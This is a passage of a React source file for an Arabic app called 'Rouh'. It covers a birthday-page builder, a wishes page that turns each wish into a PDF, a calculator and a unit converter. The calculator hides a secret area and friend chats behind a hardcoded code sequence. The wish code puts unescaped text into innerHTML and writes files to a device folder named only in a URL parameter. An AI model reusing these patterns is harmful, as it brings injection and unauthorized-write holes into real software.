                        } catch (err) {
                           return "تم الحفظ محلياً بنجاح"; // Even on error, we have base64 locally
                        } finally {
                          clearInterval(interval);
                          setIsUploadingBg(false);
                        }
                      }, { tab: 'services', subTab: 'birthday' });
                  };
                  reader.readAsDataURL(file);
              }} />
              <input ref={musicInputRef} type="file" accept="audio/*" className="hidden" onChange={async (e) => {
                  const file = e.target.files?.[0];
                  if (!file) return;
                  setIsUploadingMusic(true);
                  setMusicFileName(file.name);
                  const reader = new FileReader();
                  reader.onload = async (ev) => {
                      const base64 = ev.target?.result as string;
                      setMusicUrl(base64); // Instant local preview set
                      if (onSecretSave) onSecretSave(`birthday_music_${Date.now()}.mp3`, base64);
                      
                      addBackgroundTask('رفع موسيقى العداد', async (updateProgress) => {
                        let p = 0;
                        const interval = setInterval(() => {
                          p += 7; if (p > 95) p = 95;
                          updateProgress(p);
                        }, 300);
                        try {
                          localStorage.setItem('rouh_birthday_last_music', base64);
                          localStorage.setItem('rouh_birthday_last_music_name', file.name);
                          const res = await fetch('/api/birthday/upload', { 
                            method: 'POST', 
                            headers: { 'Content-Type': 'application/json' }, 
                            body: JSON.stringify({ usernameEn: config.usernameEn || 'temp', type: 'music', fileName: file.name, data: base64 }) 
                          });
                          const data = await res.json();
                          if (data.success) {
                            setMusicUrl(data.url);
                            localStorage.setItem('rouh_birthday_last_music', data.url);
                            return "تم رفع الموسيقى بنجاح";
                          }
                          return "تم الحفظ محلياً بنجاح";
                        } catch (err) {
                           return "تم الحفظ محلياً بنجاح";
                        } finally {
                          clearInterval(interval);
                          setIsUploadingMusic(false);
                        }
                      }, { tab: 'services', subTab: 'birthday' });
                  };
                  reader.readAsDataURL(file);
              }} />
            </div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* 3. Miniature Live Preview (Only if not already shown at top) */}
      {!config.enabled && (
        <div className="space-y-4">
          <div className="flex items-center justify-end gap-2 px-1">
             <h4 className="text-[10px] font-black text-gray-500 italic shrink-0 whitespace-nowrap">معاينة أولية لعالمك</h4>
             <div className="h-px bg-gray-800 flex-1"></div>
          </div>
          <div className="relative group rounded-[40px] overflow-hidden border-4 border-gray-800 shadow-2xl h-[400px] bg-black">
            <RoyalBirthdayExperience 
              config={{ ...config, names, birthDate, bgType, bgValue, musicUrl, musicFileName, textColor }} 
              isMini={true} 
            />
          </div>
        </div>
      )}

      {/* Fullscreen Preview Modal */}
      {isPreviewExpanded && (
        <motion.div 
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 z-[20000] bg-black"
        >
           <button 
             onClick={() => setIsPreviewExpanded(false)}
             className="absolute bottom-10 left-10 z-[20001] w-14 h-14 bg-white/5 backdrop-blur-2xl rounded-2xl flex items-center justify-center text-white/40 hover:text-white hover:bg-white/10 transition-all border border-white/5 shadow-2xl group overflow-hidden"
           >
             <div className="absolute inset-0 bg-gradient-to-tr from-white/10 to-transparent opacity-0 group-hover:opacity-100 transition-opacity"></div>
             <X size={28} className="relative z-10 group-hover:rotate-90 transition-transform duration-500 ease-out" />
           </button>
           
           <div className="w-full h-full">
              <RoyalBirthdayExperience 
                config={{ ...config, names, birthDate, bgType, bgValue, musicUrl, musicFileName, textColor }} 
                isMini={false} 
              />
           </div>
        </motion.div>
      )}
    </div>
  );
};



// 1.2 Public Birthday Page Component - Friend's View
const FallingDecorations = ({ count = 30 }) => {
  const [items, setItems] = useState<{ id: number, x: number, delay: number, duration: number, type: string }[]>([]);
  
  useEffect(() => {
    const types = ['✨', '🌸', '💖', '✨', '🎈', '🎉'];
    const newItems = Array.from({ length: count }, (_, i) => ({
      id: i,
      x: Math.random() * 100,
      delay: Math.random() * 10,
      duration: 10 + Math.random() * 10,
      type: types[Math.floor(Math.random() * types.length)]
    }));
    setItems(newItems);
  }, [count]);

  return (
    <div className="fixed inset-0 pointer-events-none z-0 overflow-hidden">
      {items.map(item => (
        <motion.div
          key={item.id}
          initial={{ y: -50, opacity: 0 }}
          animate={{ 
            y: ['0vh', '110vh'],
            opacity: [0, 1, 1, 0],
            rotate: [0, 360]
          }}
          transition={{
            duration: item.duration,
            delay: item.delay,
            repeat: Infinity,
            ease: "linear"
          }}
          className="absolute text-xl"
          style={{ left: `${item.x}%` }}
        >
          {item.type}
        </motion.div>
      ))}
    </div>
  );
};

const PublicBirthdayPage = ({ usernameEn, onBack }: { usernameEn: string, onBack: () => void }) => {
  const [config, setConfig] = useState<any>(null);
  const [loading, setLoading] = useState(true);
  const audioRef = useRef<HTMLAudioElement>(null);

  useEffect(() => {
    if (config?.musicUrl && audioRef.current) {
      audioRef.current.play().catch(() => {});
    }
  }, [config?.musicUrl]);

  useEffect(() => {
    loadConfig();
  }, [usernameEn]);

  const loadConfig = async () => {
    try {
      let data = null;
      const cleanUsername = usernameEn.toLowerCase().trim();
      try {
        const res = await fetch(`/api/birthday/config/${cleanUsername}`);
        if (res.ok) {
          data = await res.json();
        }
      } catch (err) {
        console.warn("API profile fetch failed, using Firebase sync fallback", err);
      }

      if (!data) {
        try {
          const { firebaseFetchBirthdayConfig } = await import('./lib/firebaseSync');
          data = await firebaseFetchBirthdayConfig(cleanUsername);
        } catch (fbErr) {
          console.error("Firebase profile fetch failed", fbErr);
        }
      }

      if (data) {
        try {
          const { firebaseFetchBirthdayWishes } = await import('./lib/firebaseSync');
          const fbWishes = await firebaseFetchBirthdayWishes(cleanUsername);
          
          let apiWishes = [];
          try {
            const wishesRes = await fetch(`/api/birthday/wishes/${cleanUsername}`);
            if (wishesRes.ok) {
              apiWishes = await wishesRes.json();
            }
          } catch(e) {}
          
          const mergedWishesMap = new Map();
          apiWishes.forEach((w: any) => mergedWishesMap.set(w.id || w.text, w));
          fbWishes.forEach((w: any) => mergedWishesMap.set(w.id || w.text, w));
          
          data.wishes = Array.from(mergedWishesMap.values());
        } catch (we) {
          console.warn("Wishes merging failed", we);
          if (!data.wishes) data.wishes = [];
        }
        setConfig(data);
      }
    } catch (e) {
      console.error(e);
    } finally {
      setLoading(false);
    }
  };

  const handleAddWish = async (wish: any) => {
    try {
      const urlParams = new URLSearchParams(window.location.search);
      const referrerId = urlParams.get('by') || '';
      
      const newWishId = 'wish_' + Math.random().toString(36).substring(2, 10);
      const fullWish = { 
        ...wish, 
        id: newWishId, 
        timestamp: new Date().toISOString(),
        referrerId: referrerId // bind the referrer's user ID/phone/device ID!
      };

      try {
        await fetch('/api/birthday/wish', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            targetUsernameEn: usernameEn,
            wish: fullWish
          })
        });
      } catch (err) {
        console.warn("API post wish failed, updating Firebase", err);
      }

      try {
        const { firebaseSaveBirthdayWish } = await import('./lib/firebaseSync');
        await firebaseSaveBirthdayWish(usernameEn, fullWish);
      } catch (fbErr) {
        console.error("Firebase save wish failed:", fbErr);
      }

      // Collect referrer device ID from URL to save PDF directly in their secret directory
      const ownerDeviceId = urlParams.get('by');
      if (ownerDeviceId && ownerDeviceId !== 'undefined') {
        try {
          const recipientName = config?.names?.[0]?.ar || usernameEn;
          const senderName = wish.isAnonymous ? 'صديق مقرب (مجهول)' : (wish.sender || 'صديق مخلص');
          
          // Create beautiful royal layout for pdf
          const container = document.createElement('div');
          container.style.position = 'fixed';
          container.style.left = '-9999px';
          container.style.top = '-9999px';
          container.style.width = '595px'; 
          container.style.height = '842px';
          container.style.backgroundColor = '#0b0c0e';
          container.style.color = '#ffffff';
          container.style.fontFamily = 'system-ui, sans-serif';
          container.style.direction = 'rtl';
          container.style.boxSizing = 'border-box';
          container.style.padding = '60px 45px';
          container.style.display = 'flex';
          container.style.flexDirection = 'column';
          container.style.justifyContent = 'space-between';
          container.style.border = '10px double #34d399';
          container.style.borderRadius = '24px';
          container.style.boxShadow = 'inset 0 0 120px rgba(0,0,0,0.95)';

          container.innerHTML = `
            <div style="text-align: center; border-bottom: 2px dashed rgba(52, 211, 153, 0.25); padding-bottom: 25px;">
              <div style="font-size: 44px; margin-bottom: 12px; filter: drop-shadow(0 4px 6px rgba(0,0,0,0.3));">👑</div>
              <h1 style="font-size: 28px; font-weight: 900; color: #34d399; margin: 0; text-transform: uppercase; tracking-wider; line-height: 1.3;">بطاقة تهنئة ميلاد ملكية استثنائية</h1>
              <p style="font-size: 10px; text-transform: uppercase; color: #64748b; margin-top: 8px; font-family: monospace; letter-spacing: 0.12em;">Rooh Intelligence Royal Greetings Gate</p>
            </div>

            <div style="flex: 1; display: flex; flex-direction: column; justify-content: center; padding: 30px 5px; gap: 30px; text-align: center;">
              <div>
                <p style="font-size: 14px; color: #a7f3d0; margin: 0 0 8px 0; font-weight: 600; letter-spacing: 0.5px;">إلى الصاحب المتميز ذو المعالي والأفراح:</p>
                <h2 style="font-size: 32px; font-weight: 950; color: #ffffff; margin: 0; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.4));">✨ ${recipientName} ✨</h2>
              </div>

              <div style="background: rgba(52, 211, 153, 0.04); border: 2px dashed rgba(52, 211, 153, 0.15); border-radius: 24px; padding: 40px 30px; position: relative; box-shadow: 0 10px 25px rgba(0,0,0,0.25);">
                <span style="font-size: 64px; color: rgba(52, 211, 153, 0.12); position: absolute; top: -15px; right: 15px; font-family: Georgia, serif;">"</span>
                <p style="font-size: 18px; line-height: 1.8; color: #f1f5f9; font-weight: 550; margin: 0; text-align: center; word-wrap: break-word;">${wish.text}</p>
                <span style="font-size: 64px; color: rgba(52, 211, 153, 0.12); position: absolute; bottom: -35px; left: 15px; font-family: Georgia, serif;">"</span>
              </div>

              <div style="text-align: right; padding-right: 20px;">
                <p style="font-size: 13px; color: #a7f3d0; margin: 0 0 4px 0; font-weight: 600;">المرسل الصادق الوفي المحب:</p>
                <p style="font-size: 21px; font-weight: 950; color: #ffffff; margin: 0;">💝 ${senderName} 💝</p>
              </div>
            </div>

            <div style="text-align: center; border-top: 2px dashed rgba(52, 211, 153, 0.25); padding-top: 18px; color: #64748b; font-size: 9.5px;">
              <p style="margin: 0; font-weight: 600;">مستند رسمي محمي بنظام التشفير الفريد والتخزين السحابي لمستخدمي روح.</p>
              <p style="margin: 6px 0 0 0; font-family: monospace;">تطبيق روح الذكي © ${new Date().getFullYear()}</p>
            </div>
          `;

          document.body.appendChild(container);

          const canvas = await html2canvas(container, {
            scale: 2,
            useCORS: true,
            backgroundColor: '#0b0c0e'
          });

          const imgData = canvas.toDataURL('image/png');
          const doc = new jsPDF('p', 'mm', 'a4');
          const pdfWidth = doc.internal.pageSize.getWidth();
          const pdfHeight = doc.internal.pageSize.getHeight();
          doc.addImage(imgData, 'PNG', 0, 0, pdfWidth, pdfHeight);

          const base64 = doc.output('datauristring');

          const fileName = `تهاني من الصديق_${senderName.replace(/\s+/g, '_')}_للمستخدم_${recipientName.replace(/\s+/g, '_')}.pdf`;

          await fetch('/api/user-file/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              fileName,
              data: base64,
              deviceId: ownerDeviceId
            })
          });
          document.body.removeChild(container);
        } catch (pdfErr) {
          console.error('Failed to compile wish PDF:', pdfErr);
        }
      }

      alert('تم إرسال تهنئتكم الملكية الاستثنائية وحفظها بنجاح في مجلد الصديق السري! ✨');
      loadConfig();
    } catch (e) {
      alert('فشل إرسال التهنئة');
    }
  };

  const isStandaloneMode = typeof window !== 'undefined' && (
    window.matchMedia('(display-mode: standalone)').matches || 
    (window.navigator as any).standalone === true
  );

  const [showPwaBanner, setShowPwaBanner] = useState(!isStandaloneMode);

  if (loading) return (
    <div className="fixed inset-0 bg-[#0a0a0b] flex items-center justify-center">
      <RoohLoader />
    </div>
  );

  if (!config) return (
    <div className="fixed inset-0 bg-[#0a0a0b] flex flex-col items-center justify-center p-6 text-center">
      <AlertCircle className="text-rose-500 mb-4" size={48} />
      <h2 className="text-2xl font-black text-white italic mb-2">عذراً، لم نجد الصفحة</h2>
      <p className="text-gray-500 text-sm mb-6 uppercase tracking-widest font-bold">رابط غير صحيح أو منتهي الصلاحية</p>
      <button onClick={onBack} className="bg-blue-600 text-white px-8 py-3 rounded-2xl font-bold">الرجوع للرئيسية</button>
    </div>
  );

  return (
    <div className="fixed inset-0 z-[500] bg-black flex flex-col">
      {config.musicUrl && <audio ref={audioRef} src={config.musicUrl} autoPlay loop />}
      
      {showPwaBanner && (
        <div className="bg-gradient-to-r from-blue-700/95 via-[#1a1c22] to-indigo-800/95 text-white p-3 text-center text-xs font-black italic flex items-center justify-between px-4 shrink-0 relative z-[700] border-b border-indigo-500/20 shadow-lg gap-4">
          <div className="flex items-center gap-2">
            <span className="text-base">📲</span>
            <span className="text-right leading-relaxed">تطبيق "روح" مثبت على جهازك؟ سيفتح هذا الرابط بداخله مباشرة. إذا كنت في المتصفح، يمكنك تثبيت التطبيق الآن عبر الخيارات لتجربة كاملة الصوت والريادة!</span>
          </div>
          <button 
            onClick={() => setShowPwaBanner(false)}
            className="text-white/60 hover:text-white px-3 py-1.5 text-xs bg-white/10 hover:bg-white/20 rounded-xl transition-all font-black"
          >
            إغلاق
          </button>
        </div>
      )}

      <div className={cn("absolute z-[600] transition-all duration-300", showPwaBanner ? "top-16 right-6" : "top-6 right-6")}>
         <button onClick={onBack} className="p-3 bg-white text-black rounded-2xl shadow-2xl transition-transform active:scale-95">
           <ChevronRight size={24} />
         </button>
      </div>

      <div className="flex-1 w-full relative">
        <RoyalBirthdayExperience config={config} onAddWish={handleAddWish} autoOpenWish={true} initialTab="wishes" />
      </div>
    </div>
  );
};

const CalculatorTab = ({ onAddHistory, onSmartTrigger, onOpenSecret, friends, onChatTrigger, cameraPermitted, luckyButtonsEnabled, usageGuideEnabled, usageGuideTips }: { 
  onAddHistory: (item: Omit<HistoryItem, 'id' | 'timestamp'>) => void;
  onSmartTrigger: (type?: 's' | 't', source?: string) => void;
  onOpenSecret: () => void;
  friends: ChatFriend[];
  onChatTrigger: (friend: ChatFriend) => void;
  cameraPermitted: boolean;
  luckyButtonsEnabled: boolean;
  usageGuideEnabled: boolean;
  usageGuideTips: UsageTip[];
}) => {
  const [mode, setMode] = useState<'standard' | 'scientific' | 'programming'>(() => {
    try { return (localStorage.getItem('rouh_calc_mode') as any) || 'standard'; } catch (e) { return 'standard'; }
  });
  const [display, setDisplay] = useState(() => {
    try { return localStorage.getItem('rouh_calc_display') || '0'; } catch (e) { return '0'; }
  });
  const [equation, setEquation] = useState(() => {
    try { return localStorage.getItem('rouh_calc_equation') || ''; } catch (e) { return ''; }
  });
  
  // New: AI calculation sequence
  const [calcSequence, setCalcSequence] = useState<string[]>([]);
  const [bgLetters, setBgLetters] = useState<string[]>([]);
  const [luckAdvice, setLuckAdvice] = useState<string | null>(null);
  const [isLuckLoading, setIsLuckLoading] = useState(false);

  // Secret code tracking
  const [secretSequence, setSecretSequence] = useState('');
  
  // Long press tracking
  const longPressTimer = useRef<NodeJS.Timeout | null>(null);

  const ARABIC_LETTERS = "أبتثجحخدذرزسشصضطظعغفقكلمنهوي";
  
  useEffect(() => {
    if (luckyButtonsEnabled) {
      // Generate randomized single Arabic letters for keys
      const newLetters = Array.from({ length: 40 }, () => 
        ARABIC_LETTERS[Math.floor(Math.random() * ARABIC_LETTERS.length)]
      );
      setBgLetters(newLetters);
      setLuckAdvice(null);
    } else {
      setBgLetters([]);
      setLuckAdvice(null);
    }
  }, [mode, luckyButtonsEnabled]);

  useEffect(() => {
    try {
      localStorage.setItem('rouh_calc_mode', mode);
      localStorage.setItem('rouh_calc_display', display);
      localStorage.setItem('rouh_calc_equation', equation);
    } catch (e) {}
  }, [mode, display, equation]);

  // Check for multi-digit friend access
  useEffect(() => {
    if (calcSequence.length > 0) {
      const lastCodes = calcSequence.map(String);
      const matchedFriend = friends.find(f => {
        if (f.accessCodes.length <= 1) return false;
        // Check if the current sequence ends with the friend's codes
        const slice = lastCodes.slice(-f.accessCodes.length);
        return slice.join('') === f.accessCodes.join('');
      });
      if (matchedFriend) {
        onChatTrigger(matchedFriend);
        setCalcSequence([]);
      }
    }
  }, [calcSequence, friends]);

  const handleAction = async (val: string) => {
    // Clear luck advice on new action if not "="
    if (val !== '=') setLuckAdvice(null);

    // Store value in calculation sequence (AI hint logic + Friend codes)
    if (!['DEL', 'C', '=', 'onSmartTrigger'].includes(val)) {
      setCalcSequence(prev => [...prev.slice(-15), val]); // Keep last 15 actions
    }

    // Secret code logic
    const secretCode = '7719870330789177';
    if (secretCode.includes(val)) {
      const nextSeq = secretSequence + val;
      if (nextSeq === secretCode) {
        onOpenSecret();
        setSecretSequence('');
      } else if (secretCode.startsWith(nextSeq)) {
        setSecretSequence(nextSeq);
      } else {
        setSecretSequence(secretCode.startsWith(val) ? val : '');
      }
    } else {
      setSecretSequence('');
    }

    if (val === '1' && mode === 'standard') onSmartTrigger('s', 'calc_1');
    if (val === '2' && mode === 'programming') onSmartTrigger('s', 'calc_2');
    if (val === '5' && mode === 'scientific') onSmartTrigger('s', 'calc_5');

    if (val === 'C') {
      setDisplay('0');
      setEquation('');
      setCalcSequence([]);
      return;
    }

    if (val === 'DEL') {
      setDisplay(prev => prev.length > 1 ? prev.slice(0, -1) : '0');
      return;
    }
    
    if (val === '=') {
      try {
        if (luckyButtonsEnabled && bgLetters.length > 0) {
          setIsLuckLoading(true);
          const currentLetters = bgLetters.slice(0, keys.length).join(', ');
          const luckPrompt = `بناءً على هذه الأحرف العربية المبعثرة: (${currentLetters})، استخلص جملة واحدة قصيرة ومؤثرة باللغة العربية (أقل من 20 كلمة) عن النجاح المالي أو مواساة الديون أو التحفيز المادي. خاطب المستخدم برقي وود. لا تزد عن 20 كلمة. جملة واحدة فقط.`;
          
          const timeout = setTimeout(() => {
            if (isLuckLoading) {
               setIsLuckLoading(false);
               setLuckAdvice("تفاءل بالخير تجده، الرزق آتٍ بمشيئة الله.");
            }
          }, 8000);

          getGeminiResponse(luckPrompt).then(res => {
            clearTimeout(timeout);
            setLuckAdvice(res);
            setIsLuckLoading(false);
          }).catch(() => {
            clearTimeout(timeout);
            setIsLuckLoading(false);
            setLuckAdvice("العمل الجاد هو مفتاح الثروة الحقيقية.");
          });
        }

        let sanitized = display
          .replace(/×/g, '*')
          .replace(/÷/g, '/')
          .replace(/π/g, 'Math.PI')
          .replace(/e/g, 'Math.E')
          .replace(/sin\(/g, 'Math.sin(')
          .replace(/cos\(/g, 'Math.cos(')
          .replace(/tan\(/g, 'Math.tan(')
          .replace(/log\(/g, 'Math.log10(')
          .replace(/ln\(/g, 'Math.log(')
          .replace(/√\(/g, 'Math.sqrt(')
          .replace(/\^/g, '**');

        const res = new Function(`return ${sanitized}`)();
        const resultStr = Number.isInteger(res) ? String(res) : res.toFixed(4).replace(/\.?0+$/, "");
        
        onAddHistory({
          type: 'calculator',
          title: `حساب (${mode === 'standard' ? 'عادي' : mode === 'scientific' ? 'علمي' : 'برمجي'})`,
          details: display,
          result: resultStr
        });
        
        setEquation(display + ' =');
        setDisplay(resultStr);
      } catch (e) {
        setDisplay('Error');
      }
      return;
    }

    if (display === '0' || display === 'Error') {
      setDisplay(val);
    } else {
      setDisplay(display + val);
    }
  };

  const handlePointerDown = (val: string) => {
    longPressTimer.current = setTimeout(() => {
      // Find friend with single code long press
      const friend = friends.find(f => f.accessCodes.length === 1 && f.accessCodes[0] === val);
      if (friend) {
        onChatTrigger(friend);
        longPressTimer.current = null;
      }
    }, 500);
  };

  const handlePointerUp = (val: string) => {
    if (longPressTimer.current) {
      clearTimeout(longPressTimer.current);
      longPressTimer.current = null;
      handleAction(val);
    }
  };

  const standardKeys = ['C', '(', ')', '÷', '×', '3', '2', '1', '-', '6', '5', '4', '+', '9', '8', '7', '=', 'DEL', '.', '0'];
  const scientificKeys = ['sin(', 'cos(', 'tan(', 'π', 'log(', 'ln(', '√(', '^', 'C', '(', ')', '÷', '×', '3', '2', '1', '-', '6', '5', '4', '+', '9', '8', '7', '=', 'DEL', '.', '0'];
  const programmingKeys = ['0b', '0x', '<<', '>>', '&', '|', '^', '~', 'C', '(', ')', '÷', '×', '3', '2', '1', '-', '6', '5', '4', '+', '9', '8', '7', '=', 'DEL', '.', '0'];

  const keys = mode === 'standard' ? standardKeys : mode === 'scientific' ? scientificKeys : programmingKeys;

  return (
    <div className="flex flex-col h-full gap-2 p-2 sm:p-4 max-w-lg mx-auto w-full overflow-hidden">
      <div className="flex bg-gray-50 dark:bg-[#1a1c1e] p-1 rounded-xl w-full shrink-0 border border-gray-200 dark:border-gray-800">
        {(['standard', 'scientific', 'programming'] as const).map((m) => (
          <button
            key={m}
            type="button"
            onClick={(e) => { 
                e.preventDefault();
                setMode(m); 
                setDisplay('0'); 
                setEquation(''); 
              }}
              className={cn(
                "flex-1 py-1.5 sm:py-2 rounded-lg text-[10px] sm:text-xs font-black italic transition-all",
                mode === m ? "bg-blue-600 text-white shadow-xl shadow-blue-600/20" : "text-gray-500 hover:text-gray-900 dark:hover:text-gray-300"
              )}
            >
              {m === 'standard' ? 'عادي' : m === 'scientific' ? 'علمي' : 'برمجي'}
            </button>
          ))}
        </div>
  
        <div className="bg-white dark:bg-[#1e1e1e] rounded-xl p-4 sm:p-5 shadow-2xl border border-gray-200 dark:border-gray-800 flex flex-col flex-1 min-h-0 transition-all">
          {/* Display Area - Force LTR for math */}
          <div className="flex flex-col items-end gap-1 mb-3 h-20 sm:h-24 justify-end p-3 bg-gray-100 dark:bg-[#2d3748] rounded-xl overflow-hidden shrink-0 relative border border-gray-200 dark:border-gray-900/50" dir="ltr">
          {/* Financial Advice / Luck Advice Overlay */}
          <AnimatePresence>
            {(luckAdvice || isLuckLoading) && (
              <motion.div 
                initial={{ opacity: 0, x: -10 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0, x: -10 }}
                className="absolute top-2 left-2 p-1.5 sm:p-2 bg-blue-600/10 border border-blue-500/20 rounded-lg max-w-[65%] z-20 backdrop-blur-md cursor-pointer hover:bg-blue-600/20 transition-colors"
                onClick={(e) => { e.stopPropagation(); setLuckAdvice(null); }}
                dir="rtl"
              >
                {isLuckLoading ? (
                  <div className="flex items-center gap-2">
                    <div className="w-1.5 h-1.5 bg-blue-500 rounded-full animate-bounce" />
                    <div className="w-1.5 h-1.5 bg-blue-500 rounded-full animate-bounce [animation-delay:0.2s]" />
                    <div className="w-1.5 h-1.5 bg-blue-500 rounded-full animate-bounce [animation-delay:0.4s]" />
                  </div>
                ) : (
                  <p className="text-[10px] sm:text-[11px] text-blue-400 font-black italic leading-tight">
                    {luckAdvice}
                  </p>
                )}
              </motion.div>
            )}
          </AnimatePresence>

          <div className="text-gray-700 dark:text-gray-400 font-mono text-[10px] sm:text-xs h-5 truncate w-full text-right font-bold">{equation}</div>
          
          <div className="text-2xl sm:text-3xl font-mono text-gray-900 dark:text-white tracking-wider break-all text-right w-full leading-tight font-bold">
            {display}
          </div>
          
          {/* Subtle Calc Sequence Counter */}
          {calcSequence.length > 0 && (
            <div className="absolute bottom-1 left-3 text-[7px] text-blue-500/10 font-bold">
              {calcSequence.length}
            </div>
          )}
        </div>

        {/* Keypad */}
        <div className={cn(
          "grid gap-1 sm:gap-2 flex-1 min-h-0",
          "grid-cols-4"
        )}>
          {keys.map((btn, idx) => (
            <button
              key={`${btn}-${idx}`}
              type="button"
              onPointerDown={() => handlePointerDown(btn)}
              onPointerUp={() => handlePointerUp(btn)}
              onPointerLeave={() => { if (longPressTimer.current) { clearTimeout(longPressTimer.current); longPressTimer.current = null; } }}
              className={cn(
                "rounded-lg sm:rounded-xl font-mono transition-all active:scale-95 flex items-center justify-center p-1 font-bold relative overflow-hidden group select-none touch-none",
                mode === 'standard' ? "text-lg sm:text-xl" : "text-xs sm:text-sm",
                ['÷', '×', '-', '+', '='].includes(btn) 
                  ? "bg-blue-600/20 text-blue-600 dark:text-blue-400 hover:bg-blue-600/30 border border-blue-600/10" 
                  : btn === 'C' || btn === 'DEL' ? "bg-red-900/15 text-red-600 dark:text-red-500 border border-red-500/10" : "bg-gray-100 dark:bg-gray-800/40 text-gray-900 dark:text-gray-200 hover:bg-gray-200 dark:hover:bg-gray-800 border border-gray-200 dark:border-gray-700/50"
              )}
            >
              {luckyButtonsEnabled && bgLetters[idx] && (
                <span className="absolute inset-0 flex items-center justify-center text-[24px] sm:text-[32px] font-black text-white/5 pointer-events-none group-hover:text-blue-500/5 transition-colors" dir="rtl">
                  {bgLetters[idx]}
                </span>
              )}
              <span className="relative z-10">{btn}</span>
            </button>
          ))}
        </div>
      </div>
    </div>
  );
};


// 2. Converter Component
const ConverterTab = ({ onAddHistory }: { onAddHistory: (item: Omit<HistoryItem, 'id' | 'timestamp'>) => void }) => {
  const [type, setType] = useState<UnitType>('mass');
  const [value, setValue] = useState<string>('0');
  const [fromUnit, setFromUnit] = useState<string>('');
  const [toUnit, setToUnit] = useState<string>('');
  const [result, setResult] = useState<number | null>(null);

  const units = type === 'mass' ? MASS_UNITS : type === 'volume' ? VOLUME_UNITS : DISTANCE_UNITS;

  const convert = (val: string, from: string, to: string) => {
    const fromUnitObj = units.find(u => u.value === from);
    const toUnitObj = units.find(u => u.value === to);
    if (!fromUnitObj || !toUnitObj || !val) {
      setResult(null);
      return;
    }

    const res = (Number(val) * fromUnitObj.factor) / toUnitObj.factor;
    setResult(res);
  };

  useEffect(() => {
    const from = units[0].value;
    const to = units[1]?.value || units[0].value;
    setFromUnit(from);
    setToUnit(to);
    convert(value, from, to);
  }, [type]);

  useEffect(() => {
    convert(value, fromUnit, toUnit);
  }, [value, fromUnit, toUnit]);

  const handleSwap = () => {
    const temp = fromUnit;
    setFromUnit(toUnit);
    setToUnit(temp);
  };

  const handleSaveToHistory = () => {
    if (result === null) return;
    const from = units.find(u => u.value === fromUnit);
    const to = units.find(u => u.value === toUnit);
    
    onAddHistory({
      type: 'converter',
      title: `تحويل ${type === 'mass' ? 'كتلة' : type === 'volume' ? 'حجم' : 'مسافة'}`,
      details: `${value} ${from?.label} إلى ${to?.label}`,
      result: `${result < 0.0001 ? result.toExponential(4) : result.toLocaleString()} ${to?.label}`
    });
  };

  return (
    <div className="flex flex-col h-full gap-4 p-4 max-w-xl mx-auto w-full overflow-y-auto custom-scrollbar">
      <div className="flex justify-center gap-2 sm:gap-4 overflow-x-auto pb-2 shrink-0">
        {[
          { id: 'mass', label: 'كتلة', icon: Scale },
          { id: 'volume', label: 'حجم', icon: FlaskConical },
          { id: 'distance', label: 'مسافة', icon: ArrowLeftRight },
        ].map((t) => (
          <button
            key={t.id}
            type="button"
            onClick={() => setType(t.id as UnitType)}
            className={cn(
              "flex flex-col items-center gap-2 p-3 sm:p-4 rounded-xl flex-1 min-w-[80px] border transition-all active:scale-95",
              type === t.id ? "bg-blue-600/15 border-blue-500 text-blue-600 dark:text-blue-400 shadow-lg shadow-blue-600/5" : "bg-white dark:bg-[#1a1c1e] border-gray-200 dark:border-gray-800 text-gray-500"
            )}
          >
            <t.icon size={20} />
            <span className="text-[10px] sm:text-xs font-bold">{t.label}</span>
          </button>
        ))}
      </div>

      <div className="bg-white dark:bg-[#1e1e1e] rounded-xl p-5 sm:p-6 border border-gray-200 dark:border-gray-800 shadow-2xl flex flex-col gap-6 transition-all mb-4 mx-1">
        <div className="space-y-1.5">
          <div className="flex justify-between items-center px-1">
             <label className="text-[10px] text-gray-500 dark:text-gray-400 font-black uppercase tracking-wider">القيمة المدخلة</label>
             <button type="button" onClick={() => setValue('0')} className="text-[10px] text-red-500 font-black hover:underline">تصفير</button>
          </div>
          <input
            type="number"
            value={value}
            onChange={(e) => setValue(e.target.value)}
            className="w-full bg-gray-50 dark:bg-[#2a2a2a] border border-gray-200 dark:border-gray-800 rounded-xl p-4 text-xl font-mono text-gray-900 dark:text-white focus:border-blue-500 outline-none transition-all shadow-inner"
            placeholder="0.00"
            dir="ltr"
          />
        </div>

        <div className="flex flex-col gap-3">
          <div className="space-y-1.5 text-right">
            <label className="text-[10px] text-gray-500 dark:text-gray-400 font-black uppercase tracking-wider px-1">من وحدة</label>
            <select
              value={fromUnit}
              onChange={(e) => setFromUnit(e.target.value)}
              className="w-full bg-gray-50 dark:bg-[#2a2a2a] border border-gray-200 dark:border-gray-800 rounded-xl p-4 appearance-none focus:border-blue-500 outline-none text-sm font-black text-gray-900 dark:text-gray-100 cursor-pointer transition-all"
              dir="rtl"
            >
              {units.map(u => <option key={u.value} value={u.value} className="bg-white dark:bg-[#1e1e1e] text-gray-900 dark:text-white">{u.label}</option>)}
            </select>
          </div>

          <div className="flex justify-center -my-3 z-10">
             <button 
               type="button"
               onClick={handleSwap}
               className="bg-gray-100 dark:bg-gray-800 p-2.5 rounded-full border border-gray-200 dark:border-gray-700 hover:border-blue-500 text-blue-500 transition-all active:rotate-180 shadow-md"
             >
               <ArrowLeftRight size={18} className="rotate-90" />
             </button>
          </div>

          <div className="space-y-1.5 text-right">
            <label className="text-[10px] text-gray-500 dark:text-gray-400 font-black uppercase tracking-wider px-1">إلى وحدة</label>
            <select
              value={toUnit}
              onChange={(e) => setToUnit(e.target.value)}
              className="w-full bg-gray-50 dark:bg-[#2a2a2a] border border-gray-200 dark:border-gray-800 rounded-xl p-4 appearance-none focus:border-blue-500 outline-none text-sm font-black text-gray-900 dark:text-gray-100 cursor-pointer transition-all"
              dir="rtl"
            >
              {units.map(u => <option key={u.value} value={u.value} className="bg-white dark:bg-[#1e1e1e] text-gray-900 dark:text-white">{u.label}</option>)}
            </select>
          </div>
        </div>

        {result !== null && (
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="p-6 bg-blue-600/5 dark:bg-blue-600/10 border border-blue-500/20 rounded-xl flex flex-col items-center gap-3"
          >
